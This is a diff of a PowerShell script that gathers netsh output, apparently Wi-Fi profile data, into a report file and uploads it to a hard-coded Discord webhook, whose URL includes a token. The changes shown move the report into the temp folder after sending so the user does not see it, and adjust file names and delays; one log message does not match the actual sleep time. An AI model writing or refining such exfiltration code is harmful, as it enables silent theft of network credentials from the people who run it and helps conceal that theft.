@@ -1,5 +1,5 @@
 # ========== CONFIG ==========
-$DebugMode = $false  # <-- Set to $true for verbose logging, keep window open, no auto-delete
+$DebugMode = $false  # <-- Set to $true for verbose logging, keep window open
 
 # ========== INTERNAL LOGGER ==========
 function Write-DebugLog {
@@ -50,7 +50,7 @@ if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administra
 }
 
 # ========== OUTPUT FILE ==========
-$outFile = Join-Path $env:USERPROFILE "Downloads\netshresult.txt"
+$outFile = Join-Path $env:USERPROFILE "Downloads\netshreport.txt"
 Write-DebugLog "Output file: $outFile"
 
 # ========== INIT FILE ==========
@@ -124,8 +124,8 @@ $WarningPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
 # ========== WAIT 5 SECONDS ==========
-Write-DebugLog "Waiting 2 seconds before sending to Discord..."
-Start-Sleep -Seconds 2
+Write-DebugLog "Waiting 5 seconds before sending to Discord..."
+Start-Sleep -Seconds 1.8
 
 # ========== SEND TO DISCORD (PowerShell 5.1 Compatible) ==========
 $WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"
@@ -172,8 +172,15 @@ if (Test-Path $outFile) {
         $response = Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $body -Headers $headers
         Write-DebugLog "Discord response: SUCCESS"
 
+        # ✅ MOVE ORIGINAL FILE TO TEMP (AFTER SUCCESSFUL SEND)
+        $tempFinalPath = "$env:TEMP\wlan_final_$(Get-Date -Format 'yyMMddHHmmss').txt"
+        Move-Item -Path $outFile -Destination $tempFinalPath -Force
+        Write-DebugLog "MOVED original file to: $tempFinalPath"
+
     } catch {
         Write-DebugLog "ERROR sending to Discord: $($_.Exception.Message)"
+        # ❌ If send fails, leave file in Downloads for retry
+        Write-DebugLog "File remains in Downloads for manual review or retry."
     } finally {
         # ALWAYS clean up temp upload file
         if (Test-Path $TempUploadFile) {
@@ -182,18 +189,20 @@ if (Test-Path $outFile) {
         }
     }
 
-    # ✅ COPY FINAL OUTPUT FILE TO %TEMP% (as requested)
-    $tempCopyPath = "$env:TEMP\wlan_final_$(Get-Date -Format 'yyMMddHHmmss').txt"
-    Copy-Item -Path $outFile -Destination $tempCopyPath -Force
-    Write-DebugLog "Final output file copied to: $tempCopyPath"
-
 } else {
     Write-DebugLog "ERROR: Output file not found at $outFile"
 }
 
 # ========== KEEP WINDOW OPEN IF DEBUG MODE ==========
 if ($DebugMode) {
-    Write-Output "`n[DEBUG MODE] Script completed. Files saved at:`n$outFile`n$tempCopyPath"
+    if (Test-Path $outFile) {
+        Write-Output "`n[DEBUG MODE] Script completed. Final file still in:`n$outFile"
+    } else {
+        $movedFile = Get-ChildItem -Path "$env:TEMP" -Filter "wlan_final_*.txt" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+        if ($movedFile) {
+            Write-Output "`n[DEBUG MODE] Script completed. File MOVED to:`n$($movedFile.FullName)"
+        }
+    }
     Write-Output "Window will stay open. Press any key to close..."
     $null = Read-Host
 }
